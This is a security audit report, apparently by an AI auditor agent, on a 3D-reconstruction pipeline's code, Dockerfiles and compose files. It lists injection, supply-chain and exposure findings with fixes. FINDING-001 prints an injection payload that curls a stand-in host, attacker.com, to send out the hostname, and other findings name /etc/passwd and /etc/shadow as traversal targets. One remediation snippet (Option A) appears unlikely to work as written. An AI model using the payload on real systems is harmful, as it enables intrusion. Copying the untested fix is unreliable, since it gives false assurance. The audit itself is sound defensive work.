# V2 Security Audit — Gaussian Toolkit Pipeline (Wave 1+2 Artifacts)

**Date:** 2026-05-26
**Branch:** feat/v2-upgrade-swarm
**Auditor:** Security auditor agent (claude-sonnet-4-6)
**Scope:** Wave 1+2 new/changed artifacts only — see list below
**Audit type:** Code review + static analysis (no live execution)

---

## Scope of Artifacts Reviewed

- `src/pipeline/come_extractor.py`
- `src/pipeline/gaussianwrapping_extractor.py`
- `src/pipeline/splat_optimizer.py`
- `src/pipeline/fibonacci_sampler.py`
- `src/pipeline/config.py`
- `src/pipeline/stages.py` (new methods: `_train_come`, `_train_gaussianwrapping`, `_optimize_splat`, `_select_mesh_backend`)
- `src/pipeline/frame_selector.py`
- `docker/Dockerfile.come`
- `docker/install_come.sh`
- `docker/install_gaussianwrapping.sh`
- `docker/Dockerfile.milo` (changes)
- `Dockerfile.consolidated` (changes)
- `docker-compose.consolidated.yml` (changes)
- `scripts/sync_upstream.sh`
- `src/pipeline/gsplat_trainer.py`

---

## Executive Summary

The Wave 1+2 pipeline additions introduce **one Critical severity finding** and **two High severity findings** that require remediation before any wider deployment. The critical issue is a code injection vector via environment variable into a Python `-c` one-liner used as a subprocess probe. The two high findings are a confirmed supply-chain package name discrepancy and broadly unpinned git clones in Dockerfiles. All subprocess calls in the new backends use list-form (no `shell=True`), timeouts are consistently applied, and the isolation guarantee of `sync_upstream.sh` is verified intact.

---

## Findings

### FINDING-001 — Critical: Code Injection via `GW_DIR` Environment Variable

**Severity:** Critical
**File:** `src/pipeline/gaussianwrapping_extractor.py`
**Lines:** 131–133 (docker probe), 147–148 (conda probe)
**Threat model category:** Command injection / unsafe subprocess

**Description:**

`_gw_exec_prefix()` constructs Python one-liner probe code using an f-string that interpolates `GW_DIR`, which is read directly from the `GW_DIR` environment variable at module import time:

```python
GW_DIR = Path(os.environ.get("GW_DIR", "/opt/gaussianwrapping"))
...
f"import sys, pathlib; p=pathlib.Path('{GW_DIR}'); "
"sys.exit(0 if p.is_dir() else 1)"
```

This one-liner is passed as the `-c` argument to `docker exec milo python3 -c` and `conda run ... python -c`. If `GW_DIR` is set to a value containing a single-quote and Python statements — for example:

```
GW_DIR = "'); import os; os.system('curl attacker.com/exfil?h=$(hostname)')  #"
```

the resulting code string becomes syntactically valid Python that executes arbitrary OS commands inside whichever context receives it (the `milo` Docker container for the docker path, the local process for the conda path).

The conda path uses `r'{GW_DIR}'` in the Python source, but this r-prefix only prevents backslash interpretation at Python *source-parse time*; it does not prevent the injected value from breaking out of the string literal at runtime because the quote character in GW_DIR terminates the `r'...'` literal before the Python interpreter sees the "r" modifier.

**Affected paths:** Both the docker exec probe (line 131) and the conda probe (line 147) are exploitable.

**`COME_DIR` in `come_extractor.py`** does NOT have this issue. The come extractor's probe uses a hard-coded `-c "import torch; print('ok')"` string with no f-string interpolation of `COME_DIR`.

**Impact:** Arbitrary code execution in the `milo` Docker container (GPU access, `/data/output` volume, `hf-cache` volume) or on the host Python process, achievable by any actor who can set the `GW_DIR` environment variable — which includes any process or service with access to the container's environment.

**Remediation:** Replace the f-string interpolation with an approach that does not inject the path value into executable code. Two safe alternatives:

Option A — Pass the path as a command-line argument, not embedded in code:
```python
probe = subprocess.run(
    [
        "docker", "exec", "milo",
        "python3", "-c",
        "import sys, pathlib, os; p=pathlib.Path(os.environ['_GW_PROBE']); "
        "sys.exit(0 if p.is_dir() else 1)",
        "--",
    ],
    env={"_GW_PROBE": str(GW_DIR)},
    capture_output=True, text=True, timeout=10,
)
```

Option B — Use `docker exec milo test -d /opt/gaussianwrapping` (a shell test with no Python at all):
```python
probe = subprocess.run(
    ["docker", "exec", "milo", "test", "-d", str(GW_DIR)],
    capture_output=True, text=True, timeout=10,
)
```

Option B is simpler and eliminates the injection surface entirely.

---

### FINDING-002 — High: Supply-Chain Package Name Discrepancy (`@nicedoc/splat-transform` vs `@playcanvas/splat-transform`)

**Severity:** High
**Files:**
- `Dockerfile.consolidated` line 43: `npm install -g @nicedoc/splat-transform`
- `src/pipeline/splat_optimizer.py` line 37: `_NPX_PACKAGE = "@playcanvas/splat-transform"`
**Threat model category:** Supply-chain

**Description:**

The infrastructure Dockerfile installs `@nicedoc/splat-transform` globally, while the Python module `splat_optimizer.py` invokes `@playcanvas/splat-transform` via `npx`. These are **two different npm package names**, published by different maintainers.

The official PlayCanvas package is `@playcanvas/splat-transform` (published under the `playcanvas` npm org, GitHub: PlayCanvas/splat-transform). The package `@nicedoc/splat-transform` has no traceable relationship to the PlayCanvas project and its provenance on npmjs.com is unverified.

This creates two distinct risks:

1. **Functional:** At runtime, `npx @playcanvas/splat-transform` will not resolve to the globally installed `@nicedoc/splat-transform`. `npx --yes` will auto-download `@playcanvas/splat-transform` from the npm registry — meaning the Dockerfile's global install has no effect on the actual code that runs.

2. **Supply-chain typosquat / confusion:** `@nicedoc/splat-transform` is a candidate typosquat or re-publish of the legitimate PlayCanvas package. Installing an unverified package that shadows or mimics a legitimate tool is a supply-chain risk. If `@nicedoc/splat-transform` contains malicious code it executes at `npm install -g` time with the privileges of the Docker build process (root during build). Even if it is benign, it is dead code (never invoked at runtime) and should be removed.

**Impact:** Potential execution of unverified npm package during Docker build (supply-chain risk); guaranteed waste of image space; `is_splat_transform_available()` behavior may be surprising in environments without internet access (npx --yes will attempt network download even though a "splat-transform" is globally installed, because the name doesn't match).

**Remediation:**
1. Remove `npm install -g @nicedoc/splat-transform` from `Dockerfile.consolidated`.
2. Add `npm install -g @playcanvas/splat-transform@<pinned-version>` instead, or rely on the runtime `npx --yes` download with an explicit version pin in `splat_optimizer.py`:
   ```python
   _NPX_PACKAGE = "@playcanvas/splat-transform@1.x.x"  # pin to verified release
   ```
3. Verify `@nicedoc/splat-transform` on npmjs.com to confirm whether it is a legitimate re-publish (update ADR-006 with the verdict).

---

### FINDING-003 — High: Unpinned git Clones in Dockerfiles (Floating `HEAD`)

**Severity:** High
**Files:**
- `Dockerfile.consolidated` lines 55, 91, 106, 112, 135, 148, 149, 151, 176, 186
- `docker/Dockerfile.milo` lines 27–28
- `docker/install_come.sh` line 38
- `docker/install_gaussianwrapping.sh` line 37
**Threat model category:** Supply-chain

**Description:**

All git clone operations in the new and changed Docker build files clone from default branch (`HEAD` / `main` / `master`) with no commit SHA or tag pinned (beyond a `--depth 1` in a few cases). Affected repositories include:

- `https://github.com/Anttwo/MILo.git` (Dockerfile.milo)
- `https://github.com/r4dl/CoMe.git` (install_come.sh)
- `https://github.com/diego1401/GaussianWrapping.git` (install_gaussianwrapping.sh)
- `https://github.com/colmap/colmap.git` (Dockerfile.consolidated, depth 1)
- `https://github.com/microsoft/vcpkg.git` (Dockerfile.consolidated, no depth)
- `https://github.com/jjohare/gaussian-toolkit.git` (Dockerfile.consolidated)
- `https://github.com/comfyanonymous/ComfyUI.git` (Dockerfile.consolidated)
- `https://github.com/ltdrdata/ComfyUI-Manager.git` (Dockerfile.consolidated)
- `https://github.com/peteromallet/comfyui-sam3dobjects.git` (Dockerfile.consolidated)
- `https://github.com/tencent/Hunyuan3D-2.git` (Dockerfile.consolidated)
- `https://github.com/jacobvanbeets/SplatReady.git` (Dockerfile.consolidated)
- `https://github.com/facebookresearch/sam3.git` (Dockerfile.consolidated)

A compromised or malicious upstream commit merged to the default branch of any of these repositories will be silently incorporated on the next `docker build` without any signal to the operator.

**Impact:** Arbitrary code execution during Docker build or at runtime. Build reproducibility is also broken — two builds from the same Dockerfile can produce different images.

**Remediation:** Pin each `git clone` to a specific commit SHA (preferred) or signed tag:
```dockerfile
RUN git clone https://github.com/Anttwo/MILo.git /opt/milo \
    && git -C /opt/milo checkout <COMMIT_SHA>
```
Maintain a pinned-SHAs table in `research/decisions/` (or a lock file) and document the review date for each dependency. For `colmap` and `vcpkg`, tag-based pins are acceptable given their release cadence; for research repos (CoMe, GaussianWrapping, MILo) that may not use tags, commit SHA pinning is mandatory.

---

### FINDING-004 — Medium: `GW_DIR` and `COME_DIR` Path Validation — No Containment Check

**Severity:** Medium
**Files:** `src/pipeline/gaussianwrapping_extractor.py` lines 56, 160–169; `src/pipeline/come_extractor.py` lines 50, 207–215
**Threat model category:** Path traversal

**Description:**

`GW_DIR` and `COME_DIR` are read from environment variables and then used to resolve script paths via `Path(GW_DIR) / script_name`. Neither function validates that the resolved path remains within an expected base directory. If `GW_DIR` is set to `/`, `../../`, or any path outside the container's `/opt/gaussianwrapping`, the script resolution will follow it without restriction.

Example: `GW_DIR=/etc` → `_gw_script("passwd", prefix)` resolves to `/etc/passwd`, which would be passed as the script argument to `python3`.

This is distinct from FINDING-001 (which is about code injection via the probe). The path traversal risk here affects the script path passed to the actual training and extraction subprocess calls.

In the Docker context, the container filesystem is the boundary, so the practical blast radius is limited to the container image. However, in the conda fallback path the host filesystem is directly accessible.

**Remediation:** Add a containment assertion after path resolution:

```python
ALLOWED_GW_BASE = Path("/opt/gaussianwrapping")

def _gw_script(script_name: str, exec_prefix: list[str]) -> str:
    if exec_prefix and exec_prefix[0] == "docker":
        resolved = Path(f"/opt/gaussianwrapping/{script_name}").resolve()
        if not str(resolved).startswith("/opt/gaussianwrapping/"):
            raise ValueError(f"Script path escapes allowed base: {resolved}")
        return str(resolved)
    resolved = (GW_DIR / script_name).resolve()
    if not str(resolved).startswith(str(GW_DIR.resolve()) + "/"):
        raise ValueError(f"Script path escapes GW_DIR: {resolved}")
    return str(resolved)
```

Apply the same pattern to `come_extractor._resolve_script()`.

---

### FINDING-005 — Medium: Sidecar Containers Use `sleep infinity` Entrypoint with No Network Isolation

**Severity:** Medium
**Files:** `docker-compose.consolidated.yml` lines 100, 133; `docker/Dockerfile.come` line 49
**Threat model category:** Docker exposure

**Description:**

Both the `milo` and `come` sidecar containers use `entrypoint: ["sleep", "infinity"]` as their primary process. This is a common pattern for GPU sidecar containers that are operated via `docker exec`, but it has the following implications:

1. **Any process in the `gaussian-toolkit` network namespace can exec into the sidecars.** There is no explicit `network` configuration restricting inter-container communication. The sidecars are reachable by name (Docker default bridge / compose network) from the main container and from any other container on the same compose network.

2. **The sidecars expose GPU device 1 (`device_ids: ['1']`) to both `milo` and `come` simultaneously.** While this is a deliberate scheduling choice (GPU 1 is shared), it means a runaway training job in one sidecar can consume all GPU 1 VRAM and deny resources to the other.

3. The `come` sidecar Dockerfile also sets the entrypoint to `sleep infinity`, making it a persistent attack surface: if an attacker achieves code execution in the main container via FINDING-001, they can `docker exec come ...` to run arbitrary Python with GPU access and the `/data/output` volume mounted.

**Remediation:**
- Define an explicit internal compose network and restrict which services can communicate. The main container needs to reach both sidecars; the sidecars do not need to reach each other or the internet post-build.
- Consider adding a `--network-alias` with `internal: true` on the sidecar services so they are not reachable from outside the compose project.
- Document the shared GPU 1 resource contention in the operational runbook; consider adding a `cgroup` memory/compute cap per-container.

---

### FINDING-006 — Medium: `ANTHROPIC_API_KEY` Exposed as Plain Environment Variable

**Severity:** Medium
**Files:** `docker-compose.consolidated.yml` line 21
**Threat model category:** Secret handling / Docker

**Description:**

```yaml
- ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY:-}
```

The API key is passed as a plain Docker environment variable, which means it is:

1. Visible in `docker inspect <container>` output (readable by any user with Docker access on the host).
2. Visible in `/proc/<pid>/environ` inside the container (readable by any process with the same UID or root).
3. Potentially captured in log shipping, crash reports, or healthcheck output if any tooling logs the full environment.

`HF_TOKEN` has the same exposure pattern (`HF_TOKEN=${HF_TOKEN}`, line 19). Neither uses Docker secrets or a secrets management mechanism.

**Impact:** Token theft by any actor with host Docker access or container filesystem access.

**Remediation:**
- For production deployments, use Docker Swarm secrets or Docker BuildKit `--secret` mounts rather than environment variables.
- At minimum, document in the deployment guide that the Docker socket must be protected and that environment variables are visible to all processes inside the container.
- For the `claude-session` volume (line 58), ensure the OAuth session tokens stored there are excluded from any backup or sync process that might be accessible externally.

---

### FINDING-007 — Medium: `CoMeConfig.splatting_config` (User-Controllable Path) Passed Directly to Subprocess

**Severity:** Medium
**Files:** `src/pipeline/come_extractor.py` lines 100, 297; `src/pipeline/config.py` line 100
**Threat model category:** Command injection / path traversal

**Description:**

`CoMeConfig.splatting_config` defaults to `"configs/come_unbounded.json"` and is passed directly as the value for `--splatting_config` in the training command:

```python
train_cmd = exec_prefix + [
    train_script,
    COME_TRAIN_FLAG_CONFIG, cfg.splatting_config,  # user-controlled
    COME_TRAIN_FLAG_SOURCE, str(dataset_root),
    ...
]
```

This value comes from `PipelineConfig`, which is loaded from a JSON file via `PipelineConfig.load()`. If an operator supplies a crafted pipeline config JSON, they can set `training.come.splatting_config` to an arbitrary path (e.g., `/etc/passwd`, `../../etc/shadow`, or a path on a mounted volume) and the subprocess will receive that path as an argument.

Because this is passed as a list element (not shell-interpolated) the worst case is reading an arbitrary file as a config, not RCE. However:
- Inside the `come` Docker container, `/data/output` is mounted and writable; a path pointing to a location in that volume could be used to stage a malicious config and then load it.
- When CoMe adds `--splatting_config` flag handling, the config file is parsed by CoMe's own Python — if the config parser is vulnerable to path inclusion or template injection, this becomes an amplified vector.

**Remediation:** Validate `splatting_config` against an allowlist of safe relative paths or a base-directory prefix check before use:

```python
def _validate_config_path(val: str, base: Path) -> str:
    resolved = (base / val).resolve()
    if not str(resolved).startswith(str(base.resolve())):
        raise ValueError(f"splatting_config escapes allowed base: {resolved}")
    return str(resolved)
```

---

### FINDING-008 — Low: `npx --yes` Auto-Downloads Latest Package Version at Runtime

**Severity:** Low
**File:** `src/pipeline/splat_optimizer.py` lines 84, 123
**Threat model category:** Supply-chain

**Description:**

`is_splat_transform_available()` and `_build_cli_args()` both use `npx --yes @playcanvas/splat-transform`, which:
1. Downloads the package from the npm registry if not cached.
2. Always resolves to the `latest` tag unless a version is specified.
3. Runs the downloaded code immediately with the process's filesystem and GPU access.

There is no version pin. A malicious or compromised npm package release of `@playcanvas/splat-transform` would be automatically downloaded and executed on the next pipeline run that triggers the splat-optimize step.

**Remediation:** Pin the npm package to a verified version in the constant definition:
```python
_NPX_PACKAGE = "@playcanvas/splat-transform@1.0.4"  # replace with verified version
```
And document a process for reviewing and bumping this pin.

---

### FINDING-009 — Low: `docker-compose.consolidated.yml` Exposes Five Ports Bound to All Interfaces

**Severity:** Low
**File:** `docker-compose.consolidated.yml` lines 37–41
**Threat model category:** Docker exposure

**Description:**

The following ports are exposed on `0.0.0.0` (all interfaces) by default:
- `7681` — `ttyd` web terminal: grants interactive shell access to any host reachable on the network
- `5901` — VNC: full desktop access
- `45677` — LichtFeld MCP server
- `7860` — Flask web UI
- `8188` — ComfyUI

On a host that is not behind a firewall, these ports would be accessible from the public internet. The ttyd terminal and VNC are particularly sensitive as they provide direct shell/desktop access.

**Remediation:** Bind sensitive ports to `127.0.0.1` explicitly:
```yaml
ports:
  - "127.0.0.1:7681:7681"  # web terminal — host-only
  - "127.0.0.1:5901:5901"  # VNC — host-only
  - "127.0.0.1:45677:45677"
  - "0.0.0.0:7860:7860"    # web UI may need external access
  - "0.0.0.0:8188:8188"    # ComfyUI may need external access
```

---

### FINDING-010 — Low: Unbounded `rglob` on Job Directory Could Cause DoS on Large Outputs

**Severity:** Low
**Files:** `src/pipeline/stages.py` lines 676, 1847, 1924, 2014, 2062; `src/pipeline/come_extractor.py` line 389; `src/pipeline/gaussianwrapping_extractor.py` line 414
**Threat model category:** Resource/DoS

**Description:**

Several stage methods use `rglob` without depth limits over the job directory or model directory:
- `model_dir.rglob("*.ply")` — could match thousands of checkpoint PLY files in a long training run
- `self.job_dir.rglob("model/**/*.ply")` — same risk
- `self.job_dir.rglob("objects/meshes/**/*.glb")` — could match many GLB files
- `output_path.rglob("point_cloud/*/point_cloud.ply")` in both CoMe and GaussianWrapping extractors

If checkpoint saving is frequent (every 1000 iterations by default in `gsplat_trainer.py`) or the job directory is maliciously pre-populated with many files, these `rglob` calls could block the event loop for seconds and accumulate large in-memory lists.

**Remediation:** For checkpoint discovery, sort and take only the last N matches rather than collecting all:
```python
ply_files = []
for p in model_dir.rglob("*.ply"):
    ply_files.append(p)
    if len(ply_files) > 500:  # sanity cap
        break
ply_files.sort()
```
Or use a more targeted glob with a known path pattern instead of full recursive search.

---

### FINDING-011 — Info: `privileged: true` in `docker/docker-compose.yml` (Non-Consolidated Compose)

**Severity:** Info
**File:** `docker/docker-compose.yml` line 19
**Threat model category:** Docker exposure

**Description:**

The older (non-consolidated) `docker/docker-compose.yml` sets `privileged: true` on a service. This is not a Wave 1+2 artifact but was observed during the audit. The consolidated `docker-compose.consolidated.yml` does not use `privileged: true` and is the correct production compose file. This legacy flag in the non-consolidated file should be removed to prevent accidental privileged deployment.

**Remediation:** Remove `privileged: true` from `docker/docker-compose.yml` or remove the file if it is no longer used.

---

### FINDING-012 — Info: `Dockerfile.consolidated` Installs Node 23.11.1 via Unsigned Tarball

**Severity:** Info
**File:** `Dockerfile.consolidated` lines 37–39
**Threat model category:** Supply-chain

**Description:**

Node.js 23.11.1 is downloaded via `curl` and piped directly into `tar`, with no checksum or signature verification:
```dockerfile
RUN curl -fsSL https://nodejs.org/dist/v23.11.1/node-v23.11.1-linux-x64.tar.xz \
        | tar -xJ -C /usr/local --strip-components=1
```

A MITM attack or DNS compromise of `nodejs.org` during build time could substitute a malicious Node.js binary. The `curl -fsSL` flags do not verify content integrity.

**Remediation:** Verify the tarball checksum against the official SHA256SUMS file:
```dockerfile
RUN curl -fsSL https://nodejs.org/dist/v23.11.1/node-v23.11.1-linux-x64.tar.xz -o /tmp/node.tar.xz \
    && echo "EXPECTED_SHA256  /tmp/node.tar.xz" | sha256sum -c - \
    && tar -xJ -C /usr/local --strip-components=1 < /tmp/node.tar.xz \
    && rm /tmp/node.tar.xz
```

---

## Isolation Guarantee Verdict — `scripts/sync_upstream.sh`

**Verdict: ISOLATION GUARANTEE IS INTACT**

The script contains no `git push` invocation anywhere in its body. The grep-verifiable evidence:

1. `git remote set-url --push "${UPSTREAM_REMOTE}" "DISABLED"` is called unconditionally (line 161) every time the script runs, regardless of whether `DO_MERGE=1` is set.
2. The `git merge` command (line 307) operates only on the local branch. No `git push` follows it.
3. The script explicitly prints post-merge guidance that says "Only `git push origin ${SYNC_BRANCH}` to YOUR fork is permitted" — reinforcing that pushing to `upstream` is forbidden, not inadvertently permitted.
4. The `PUSH_URL` verification printout (lines 164–166) will loudly display `DISABLED` in operator logs, providing a visible confirmation.
5. A final structural comment (lines 374–380) acts as a dead-reckoning assertion for future code reviewers: "Grep for 'git push' to verify."

**One minor observation (not a finding):** The post-merge NEXT STEPS guidance at line 362 says `docker compose -f docker-compose.consolidated.yml build`, which implicitly suggests running a Docker build that would pull unpinned git clones (FINDING-003). This is not a push-to-upstream risk but does mean the sync process compounds the supply-chain exposure identified in FINDING-003.

---

## Summary: subprocess Safety Assessment

All subprocess calls in the new Wave 1+2 code use the **list form** with no `shell=True`. Specifically:

| File | Method | shell=True? | timeout? |
|---|---|---|---|
| `come_extractor.py` | probe, train, extract | No | Yes (10s, 30s, configurable) |
| `gaussianwrapping_extractor.py` | probe, train, extract | No | Yes (10s, 30s, configurable) |
| `splat_optimizer.py` | availability check, optimize | No | Yes (60s, configurable) |
| `stages.py` (ffmpeg, colmap, blender) | all callers | No | Yes (300s–3600s) |

The use of list-form subprocess with explicit timeouts is the correct pattern and is consistently applied. The injection risk in FINDING-001 occurs in the *content of one argument* (`-c` code string), not via shell expansion — but it is no less exploitable.

---

## Prioritized Fix List

| Priority | Finding | Action Required | Effort |
|---|---|---|---|
| 1 | FINDING-001 (Critical) | Replace f-string probe code with `test -d` or env-var passing | Small — 2 lines per probe |
| 2 | FINDING-002 (High) | Remove `@nicedoc/splat-transform` from Dockerfile; pin `@playcanvas/splat-transform` | Small |
| 3 | FINDING-003 (High) | Pin all git clones to commit SHAs; create SHA lock table | Medium — all Dockerfiles |
| 4 | FINDING-007 (Medium) | Add base-directory containment check on `splatting_config` | Small |
| 5 | FINDING-004 (Medium) | Add containment check in `_gw_script()` and `_resolve_script()` | Small |
| 6 | FINDING-005 (Medium) | Add explicit internal compose network; document GPU-1 contention | Small—Medium |
| 7 | FINDING-006 (Medium) | Document secret exposure; migrate to Docker secrets for prod | Medium |
| 8 | FINDING-009 (Low) | Bind-address sensitive ports to 127.0.0.1 | Trivial |
| 9 | FINDING-008 (Low) | Pin `@playcanvas/splat-transform` version in `_NPX_PACKAGE` | Trivial |
| 10 | FINDING-010 (Low) | Add depth/count caps to `rglob` calls | Small |
| 11 | FINDING-011 (Info) | Remove `privileged: true` from `docker/docker-compose.yml` | Trivial |
| 12 | FINDING-012 (Info) | Add SHA256 verification for Node.js tarball download | Small |
